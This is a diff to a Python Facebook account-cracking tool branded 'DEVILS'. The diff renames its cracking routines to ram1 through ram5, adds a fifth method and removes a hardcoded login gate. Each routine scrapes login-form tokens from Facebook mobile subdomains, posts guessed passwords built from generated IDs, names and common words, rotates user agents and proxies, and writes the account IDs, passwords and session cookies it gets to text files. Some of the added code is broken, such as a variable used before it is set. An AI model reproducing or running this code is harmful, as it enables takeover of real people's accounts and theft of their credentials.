@@ -439,23 +439,7 @@ def result(OKs,cps):
         input("Press enter to back devils Menu ")
         exit()
 
-import getpass
 
-attemps = 0
-
-while attemps < 12345677901:
-    username = input('\033[1;92mUser Name:\033[1;37m ')
-    password = input('\033[1;92mPassword:\033[1;37m ')
-
-    if username == '017' and password == '017':    	
-        print('\033[1;92mYou have successfully logged in.')
-        break
-    else:
-        print('\033[91;1mIncorrect Please Trying ')
-        #def pw():
-        attemps += 1
-        continue
-os.system('clear')
 
 loop=0
 oks=[]
@@ -1035,10 +1019,10 @@ def rndm1():
 	os.system('clear')
 	print(logo)
 	
-	print('   [1] Method 1 \n   [2] Method 2 \n   [3] Method 3 \n   [4] Method 4')
+	print('   [1] Method 1 \n   [2] Method 2 \n   [3] Method 3 \n   [4] Method 4 \n   [5] Method 5')
 	linex()
 	mthd=input(' SELECT: ')
-	if mthd in ['1','2','3','4']:
+	if mthd in ['1','2','3','4','5']:
 		os.system('clear')
 		print(logo)
 		linex()
@@ -1064,17 +1048,19 @@ def rndm1():
 		linex()
 		for guru in uid:
 			uid = ''+kode+guru
-			#uid = '100066904134068'
+			#uid = '61550110547431'
 			pwx = ['57273200','59039200','57575759','57575752','57575751',guru,kode+guru,kode[2:]+guru]
 			#pwx = ['57273200']
 			if mthd =='1':
-				yaari.submit(acrack,uid,pwx,tl)
+				yaari.submit(ram1,uid,pwx,tl)
 			if mthd =='2':
-				yaari.submit(bcrack,uid,pwx,tl)
+				yaari.submit(ram2,uid,pwx,tl)
 			if mthd =='3':
-				yaari.submit(ccrack,uid,pwx,tl)
+				yaari.submit(ram3,uid,pwx,tl)
 			if mthd =='4':
-				yaari.submit(devilsgs,uid,pwx,tl)
+				yaari.submit(ram4,uid,pwx,tl)
+			if mthd =='5':
+				yaari.submit(ram5,uid,pwx,tl)
 	linex()
 	print('[] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1090,9 +1076,9 @@ def uid():
 	kodex = input('[+] Last Name : ')
 	os.system('clear')
 	print(logo)
-	print('   [1] Method 1 \n   [2] Method 2 \n   [3] Method 3 \n   [4] Method 4')
+	print('   [1] Method 1 \n   [2] Method 2 \n   [3] Method 3 \n   [4] Method 4 \n   [5] Method 5')
 	mthd=input(' SELECT: ')
-	if mthd in ['1','2','3','4']:
+	if mthd in ['1','2','3','4','5']:
 		pass
 	else:
 		print(' Choice Method proferly')
@@ -1112,13 +1098,15 @@ def uid():
 			uid = kode+'.'+kodex+'.'+guru
 			pwx = [kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+' '+kodex,'bangladesh','@#@#@#','i love you','free fire']
 			if mthd =='1':
-				yaari.submit(acrack,uid,pwx,tl)
+				yaari.submit(ram1,uid,pwx,tl)
 			if mthd =='2':
-				yaari.submit(bcrack,uid,pwx,tl)
+				yaari.submit(ram2,uid,pwx,tl)
 			if mthd =='3':
-				yaari.submit(ccrack,uid,pwx,tl)
+				yaari.submit(ram3,uid,pwx,tl)
 			if mthd =='4':
-				yaari.submit(devilsgs,uid,pwx,tl)
+				yaari.submit(ram4,uid,pwx,tl)
+			if mthd =='5':
+				yaari.submit(ram5,uid,pwx,tl)
 	linex()
 	print('[] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1131,7 +1119,7 @@ def lock(uid):
             return 'Active'
         else:
             return 'Locked'
-def ccrack(uid,pwx,tl):
+def ram1(uid,pwx,tl):
 	#print(user)
 	global loop
 	global cps
@@ -1140,7 +1128,7 @@ def ccrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M1\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			nip=random.choice(prox)
@@ -1204,86 +1192,13 @@ def ccrack(uid,pwx,tl):
 	except:
 		pass
 		
-		
-def devilsgs(uid,pwx,tl):
-	#print(user)
-	global loop
-	global cps
-	global oks
-	global ugen
-	try:
-		for ps in pwx:
-			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M4\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
-			sys.stdout.flush()
-			ua = random.choice(ugen)
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			free_fb = session.get('https://mbasic.facebook.com').text
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'authority':'mbasic.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
-			'method': 'GET',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-  		  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-		    'cache-control': 'max-age=0',
-    		'cookie': 'datr=Z99dZdxV9vUoH3wPLHIk2gfc; sb=Z99dZZIomwpNyLGDMQIjkcE7; m_pixel_ratio=2.549999952316284; wd=424x809; fr=0adVk94PyjoU8GeFS..BlXd9n.vP.AAA.0.0.BlXeLV.AWXMClOq_XI',
- 		   'dpr': '2.549999952316284',
- 		   'sec-ch-prefers-color-scheme': 'light',
-		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-		    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
- 		   'sec-ch-ua-mobile': '?1',
-		    'sec-ch-ua-model': '"RMX3741"',
-  		  'sec-ch-ua-platform': '"Android"',
-		    'sec-ch-ua-platform-version': '"13.0.0"',
-		    'sec-fetch-dest': 'document',
-		    'sec-fetch-mode': 'navigate',
-		    'sec-fetch-site': 'none',
- 		   'sec-fetch-user': '?1',
-  		  'user-agent': ua}
-			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[65:80]
-				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
-				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				open('devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
-				oks.append(uid)
-				#cek_apk(session,coki)
-				break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[82:97]
-				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-	except:
-		pass
-		
-#def lock(uid):
-        #req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
-        #if 'Photoshop' in req:
-            #return 'Active'
-        #else:
-            #return 'Locked'
-def bcrack(uid,pwx,tl):
+def lock(uid):
+        req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
+        if 'Photoshop' in req:
+            return 'Active'
+        else:
+            return 'Locked'
+def ram2(uid,pwx,tl):
 	#print(user)
 	global loop
 	global cps
@@ -1294,79 +1209,7 @@ def bcrack(uid,pwx,tl):
 			session = requests.Session()
 			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M2\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
-			ua = random.choice(ugen66)
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			free_fb = session.get('https://free.facebook.com').text
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'authority':'free.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
-			'method': 'GET',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
-			'dnt':'1', 
-			'x-requested-with':'mark.via.gp', 
-			'sec-fetch-site': 'none',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-user': '?1',
-			'sec-fetch-dest': 'document',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="106", "Chromium";v="30", "Google Chrome";v="45"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
-			"sec-ch-prefers-color-scheme": "light",
-			'user-agent': ua}
-			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				#status = lock(uid)
-				#if "Active" in status:
-					#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'\033[1;32m')
-					#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[65:80]
-				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
-				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				open('devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
-				oks.append(uid)
-				#cek_apk(session,coki)
-				break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[82:97]
-				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-				open('devil-Cp.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-	except:
-		pass
-def acrack(uid,pwx,tl):
-	#print(user)
-	global loop
-	global cps
-	global oks
-	global ugen
-	try:
-		for ps in pwx:
-			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-RNDM>M1\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
-			sys.stdout.flush()
-			ua = random.choice(ugen66)
+			ua = random.choice(ugen)
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
 			free_fb = session.get('https://x.facebook.com').text
@@ -1403,22 +1246,251 @@ def acrack(uid,pwx,tl):
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
+				status = lock(uid)
+				if "Active" in status:
+			  	 print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'\033[1;32m')
+			 #print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[65:80]
-				print('\033[1;92m[devils-OK] '+cid+' | '+ps+'\033[1;32m')
-				print(f' Number or Email : {uid}')
-				print(f' Cookie : {coki}')
-				cookie=session.cookies.get_dict()
-				print(cookie)
-				cid= cookie["c_user"]
-				#cek_apk(session,coki)
-				open('devils-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				cid = coki[151:166]
+				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
+				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
+				open('devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(uid)
+				#cek_apk(session,coki)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
-				print('\33[1;31m[devils-CP] '+cid+' | '+ps+'\33[0;97m')
+				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
+				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except:
+		pass
+def lock(uid):
+        req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
+        if 'Photoshop' in req:
+            return 'Active'
+        else:
+            return 'Locked'
+def ram3(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global ugen
+	try:
+		for ps in pwx:
+			session = requests.Session()
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.flush()
+			ua = random.choice(ugen)
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			free_fb = session.get('https://p.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {'authority':'p.facebook.com',
+			'upgrade-insecure-requests': '1',
+			'viewport-width': '980',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
+			'dnt':'1', 
+			'x-requested-with':'mark.via.gp', 
+			'sec-fetch-site': 'none',
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-user': '?1',
+			'sec-fetch-dest': 'document',
+			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',
+			'sec-ch-ua': '" Not A;Brand";v="106", "Chromium";v="30", "Google Chrome";v="45"',
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
+			"sec-ch-prefers-color-scheme": "light",
+			'user-agent': ua}
+			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			#print(iid+'|'+pws+'|'+str(log_cookies))
+			if 'c_user' in log_cookies:
+				status = lock(uid)
+				if "Active" in status:
+			  	 print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'\033[1;32m')
+			 #print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[151:166]
+				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
+				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
+				open('devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				oks.append(uid)
+				#cek_apk(session,coki)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[82:97]
+				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
+				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except:
+		pass
+
+def ram4(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global ugen
+	try:
+		for ps in pwx:
+			session = requests.Session()
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M4\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.flush()
+			ua = random.choice(ugen)
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			free_fb = session.get('https://free.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {'authority':'free.facebook.com',
+			'upgrade-insecure-requests': '1',
+			'viewport-width': '980',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  		  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+		    'cache-control': 'max-age=0',
+    		'cookie': 'datr=Z99dZdxV9vUoH3wPLHIk2gfc; sb=Z99dZZIomwpNyLGDMQIjkcE7; m_pixel_ratio=2.549999952316284; wd=424x809; fr=0adVk94PyjoU8GeFS..BlXd9n.vP.AAA.0.0.BlXeLV.AWXMClOq_XI',
+ 		   'dpr': '2.549999952316284',
+ 		   'sec-ch-prefers-color-scheme': 'light',
+		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+		    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+ 		   'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-model': '"RMX3741"',
+  		  'sec-ch-ua-platform': '"Android"',
+		    'sec-ch-ua-platform-version': '"13.0.0"',
+		    'sec-fetch-dest': 'document',
+		    'sec-fetch-mode': 'navigate',
+		    'sec-fetch-site': 'none',
+ 		   'sec-fetch-user': '?1',
+  		  'user-agent': ua}
+			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			#print(iid+'|'+pws+'|'+str(log_cookies))
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[151:166]
+				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
+				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
+				open('devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				oks.append(uid)
+				#cek_apk(session,coki)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[82:97]
+				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
+				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except:
+		pass
+		
+def lock(uid):
+        req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
+        if 'Photoshop' in req:
+            return 'Active'
+        else:
+            return 'Locked'
+def ram5(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global ugen
+	try:
+		for ps in pwx:
+			session = requests.Session()
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M5\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.flush()
+			ua = random.choice(ugen)
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			free_fb = session.get('https://iphone.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {'authority':'iphone.facebook.com',
+			'upgrade-insecure-requests': '1',
+			'viewport-width': '980',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
+			'dnt':'1', 
+			'x-requested-with':'mark.via.gp', 
+			'sec-fetch-site': 'none',
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-user': '?1',
+			'sec-fetch-dest': 'document',
+			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',
+			'sec-ch-ua': '" Not A;Brand";v="106", "Chromium";v="30", "Google Chrome";v="45"',
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
+			"sec-ch-prefers-color-scheme": "light",
+			'user-agent': ua}
+			lo = session.post('https://iphone.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			#print(iid+'|'+pws+'|'+str(log_cookies))
+			if 'c_user' in log_cookies:
+				status = lock(uid)
+				if "Active" in status:
+			  	 print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'\033[1;32m')
+			 #print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[151:166]
+				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
+				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
+				open('devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				oks.append(uid)
+				#cek_apk(session,coki)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[82:97]
+				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
 				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(uid)
 				break
